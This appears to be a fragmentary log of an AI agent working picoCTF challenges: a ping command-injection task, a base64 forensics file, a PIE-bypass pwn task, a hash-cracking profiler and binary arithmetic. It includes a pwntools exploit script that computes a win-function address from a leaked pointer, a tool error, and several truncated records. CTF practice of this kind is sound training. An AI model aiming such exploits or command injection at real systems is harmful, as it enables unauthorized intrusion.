records.description: ping-cmd challenge at mysterious-sea.picoctf.net:53834 that pings Google DNS. Inject commands through ping input to get the flag.

records.description:
Flag in Flame
ForensicsEasy100 ptsby Prince Niyonshuti N.The SOC team discovered a suspiciously large log file after a recent breach. When they opened it, they found an enormous block of encoded text instead of typical logs. Could there be something hidden within? Your mission is to inspect the resulting file and reveal the real purpose of it. The team is relying on your skills to uncover any concealed information within this unusual log.Download the encoded data here: Logs Data. Be prepa

file_decoder: Decoded uploads/97b93ec1-5d25-4203-a6dd-89fcf0967375/logs.txt (1592212 bytes) using base64
Output: uploads/97b93ec1-5d25-4203-a6dd-89fcf0967375/logs_decoded.txt (1194159 bytes, image/png)
Output filep

records.description:
The SOC team discovered a suspiciously large log file after a recent breach. When they opened it, they found an enormous block of encoded text instead of typical logs. Could there be something hidden within? Your mission is to inspect the resulting file and reveal the real purpose of it. The team is relying on your skills to uncover any concealed information within this unusual log.
Download the encoded data here: Logs Data. Be prepared—the file is large, and examining it thoroughly is crucial

records.description:
PIE TIME
Binary Exploitation
Easy
75 pts
by Darkraicg492
Can you try to get the flag? Beware we have PIE!
Connect to the program with netcat: nc rescued-float.picoctf.net 62339
Source: https://challenge-files.picoctf.net/c_rescued_float/104935b5fd5efcea1bc050d964ac91237c79eac916f57aef8e6407af232066ae/vuln.c
Binary: https://challenge-files.picoctf.net/c_rescued_float/104935b5fd5efcea1bc050d964ac91237c79eac916f57aef8e6407af232066ae/vuln

args.exploit_script:
from pwn import *
p = remote('rescued-float.picoctf.net', 62339)
p.recvuntil(b'Address of main: ')
main = int(p.recvline().strip(), 16)
win = main - 0x133d + 0x12a7
p.sendlineafter(b'ex => 0x12345: ', hex(win).encode())
print(p.recvall().decode())

observations:
checksec_tool: Binary protections:
  Arch:       amd64-64-little
  RELRO:      Full RELRO
  Stack:      Canary found
  NX:         NX enabled
  PIE:        PIE enabled
  SHSTK:      Enabled
  IBT:        Enabled
  S

pwntools_runner:   File "/tmp/tmpxpsx9681.py", line 2
    p = remote(\'rescued-float.picoctf.net\', 62339)
                ^
SyntaxError: unexpected character after line continuation character

LLM returned invalid JSON. Try again. Raw: {"tool": "pwntools_runner", "args": {"exploit_script": "from pwn import *
p = remote('rescued-float.picoctf.net', 62339)
p.recvuntil(b'Address of main: ')
main = int(p.recvline().strip(), 16)

records.description:
Password Profiler
General Skills
Easy
100 pts
by Yahaya Meddy
We intercepted a suspicious file from a system, but instead of the password itself, it only contains its SHA-1 hash. Using OSINT techniques, you are provided with personal details about the target. Your task is to leverage this information to generate a custom password list and recover the original password by matching its hash.
Download the following files:
userinfo: https://challenge-files.picoctf.net/c_plain_mesa/3c16fb8e48ddae444f
observations:
download_file: Downloaded 113 bytes to ./uploads/userinfo.txt
MIME type: text/plain

file_reader: First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate: 15-07-1990
Partner's Name: Bob
Child's Name: Charlie

download_file: Downloaded 41 bytes to ./uploads/hash.txt
MIME type: text/plain

download_file: Downloaded 731 bytes to ./uploads/check_password.py
MIME type: text/x-script.python

records.description:
binhexa
General Skills
Easy
100 pts
by Nana Ama Atombo-Sackey
How well can you perform basic binary operations?

Start searching for the flag here nc titan.picoctf.net 53632
observations: binary_calc: 1100

remote_connect: Correct!

Question 6/6:
Operation 6: '&'
Perform the operation on Binary Number 1&2.
Enter the binary result:
binary_calc: 1000

remote_connect: Correct!

Enter the results of the last operation in hexadecimal:
binary_calc: 1000
records.workflow: connect & read prompt → compute '11101000 << 1' → send '111010000' (with newline) → compute '11101000 + 00011000' → send '100000000' (with newline) → compute '11101000 | 00011000' → send '11111000' (with newline) → compute '11101000 * 00011000' → send '1010111000000' (with newline) → compute '00011000 >> 1' → send '1100' (with newline) → compute '11101000 & 00011000' → send '1000' (with newline) → compute '1000'
